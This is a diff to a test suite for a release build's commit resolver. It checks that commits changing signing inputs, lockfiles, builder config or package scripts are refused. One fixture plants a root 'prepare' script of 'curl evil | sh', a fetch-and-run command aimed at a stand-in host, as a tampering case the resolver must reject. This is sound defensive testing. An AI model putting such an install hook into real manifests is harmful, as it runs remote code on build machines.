@@ -213,30 +213,55 @@ describe("the source commit the run builds", () => {
     });
     return readFileSync(out, "utf8");
   };
+  const rootManifest = (version, scripts = { package: "pnpm --filter app package" }) =>
+    `${JSON.stringify({ name: "orca", version, private: true, scripts }, null, 2)}\n`;
+  let origin;
   let main;
-  let candidate;
-  let sideways;
-  let toolChange;
-  let unbranched;
+  const commits = {};
+  // A branch off main with one change, so each case differs from main in exactly one input.
+  const branchWith = (name, file, content, from = main) => {
+    git(origin, "checkout", "-qb", name, from);
+    commits[name] = commit(origin, file, content);
+  };
 
   beforeEach(() => {
     work = mkdtempSync(join(tmpdir(), "orca-resolve-"));
-    const origin = join(work, "origin");
+    origin = join(work, "origin");
     mkdirSync(origin);
     git(origin, "init", "-q", "-b", "main");
+    for (const [file, content] of [
+      ["package.json", rootManifest("0.6.0")],
+      ["pnpm-lock.yaml", "lockfileVersion: '9.0'\n"],
+      ["packages/app/package.json", '{"name":"app"}\n'],
+      ["packages/app/electron-builder.yml", "appId: orca\n"],
+      ["packages/app/scripts/stage-native.js", "// v1\n"],
+    ])
+      commit(origin, file, content);
     commit(origin, "tools/packaged-windows/build-bundle.js", "v1\n");
     main = commit(origin, "README", "main\n");
-    git(origin, "checkout", "-qb", "candidate");
-    candidate = commit(origin, "package.json", '{"version":"0.7.0-rc.1"}\n');
-    git(origin, "checkout", "-qb", "tooling", main);
-    toolChange = commit(origin, "tools/packaged-windows/build-bundle.js", "v2\n");
-    git(origin, "checkout", "-qb", "old", `${main}~1`);
-    sideways = commit(origin, "other", "x\n");
+    branchWith("candidate", "package.json", rootManifest("0.7.0-rc.1"));
+    git(origin, "checkout", "-q", "candidate");
+    commits.candidate = commit(origin, "CHANGELOG.md", "0.7.0-rc.1\n");
+    branchWith("sideways", "other", "x\n", `${main}~1`);
+    branchWith("tooling", "tools/packaged-windows/build-bundle.js", "v2\n");
+    branchWith("lockfile", "pnpm-lock.yaml", "lockfileVersion: '9.0'\nevil: true\n");
+    branchWith("builder", "packages/app/electron-builder.yml", "appId: orca\nafterSign: x.js\n");
+    branchWith("hook", "packages/app/scripts/stage-native.js", "// v2\n");
+    branchWith("manifest", "packages/evil/package.json", '{"name":"evil"}\n');
+    branchWith("rootScripts", "package.json", rootManifest("0.6.0", { prepare: "curl evil | sh" }));
     git(origin, "checkout", "-q", "--detach", main);
-    unbranched = commit(origin, "dangling", "d\n");
+    commits.unbranched = commit(origin, "dangling", "d\n");
+    git(origin, "checkout", "-q", "--detach", main);
+    commits.tagOnly = commit(origin, "tagged", "t\n");
+    git(origin, "tag", "only-a-tag");
+    git(origin, "checkout", "-q", "--detach", main);
+    commits.pullOnly = commit(origin, "pulled", "p\n");
+    git(origin, "update-ref", "refs/pull/1/head", commits.pullOnly);
     git(origin, "checkout", "-q", "main");
     clone = join(work, "clone");
     git(work, "clone", "-q", "--no-local", origin, clone);
+    // The object is present locally, as a pull request head can be, but no branch holds it.
+    git(clone, "fetch", "-q", "origin", "refs/pull/1/head:refs/pull/1/head");
   });
   afterEach(() => rmSync(work, { recursive: true, force: true }));
 
@@ -244,20 +269,38 @@ describe("the source commit the run builds", () => {
     expect(resolveWith("", main)).toBe(`sha=${main}\n`);
   });
 
-  it("accepts a candidate on its own branch that descends from main and keeps the verifiers", () => {
-    expect(resolveWith(candidate, main)).toBe(`sha=${candidate}\n`);
+  it("accepts a release candidate that changes only the root version and unpinned files", () => {
+    expect(resolveWith(commits.candidate, main)).toBe(`sha=${commits.candidate}\n`);
+  });
+
+  it("accepts a branch that is not a descendant of main when its signing inputs match", () => {
+    expect(resolveWith(commits.sideways, main)).toBe(`sha=${commits.sideways}\n`);
   });
 
   it.each([
-    ["an abbreviated SHA", () => candidate.slice(0, 12)],
-    ["an uppercase SHA", () => candidate.toUpperCase()],
+    ["an abbreviated SHA", () => commits.candidate.slice(0, 12)],
+    ["an uppercase SHA", () => commits.candidate.toUpperCase()],
     ["a branch name", () => "candidate"],
-    ["a commit not descended from main", () => sideways],
-    ["a commit that changes a signing verifier", () => toolChange],
-    ["a commit on no branch of the repository", () => unbranched],
+    ["a commit that changes a signing verifier", () => commits.tooling],
+    ["a commit that changes the lockfile", () => commits.lockfile],
+    ["a commit that changes the builder configuration", () => commits.builder],
+    ["a commit that changes a packaging script", () => commits.hook],
+    ["a commit that adds a workspace package manifest", () => commits.manifest],
+    ["a commit that changes the root package.json beyond its version", () => commits.rootScripts],
+    ["a commit on no branch of the repository", () => commits.unbranched],
+    ["a commit reachable only from a tag", () => commits.tagOnly],
+    ["a commit reachable only from a pull request ref", () => commits.pullOnly],
     ["an unknown commit", () => "0".repeat(40)],
   ])("refuses %s", (_, requested) => {
-    expect(() => resolveWith(requested(), main)).toThrow();
+    let failure;
+    try {
+      resolveWith(requested(), main);
+    } catch (error) {
+      failure = error;
+    }
+    // Refused by one of the script's own checks, not by an unrelated shell error.
+    expect(failure?.status).toBe(1);
+    expect(String(failure.stdout)).toMatch(/^::error::/m);
   });
 
   it("is what prepare and sign check out, and the artifact name records", () => {
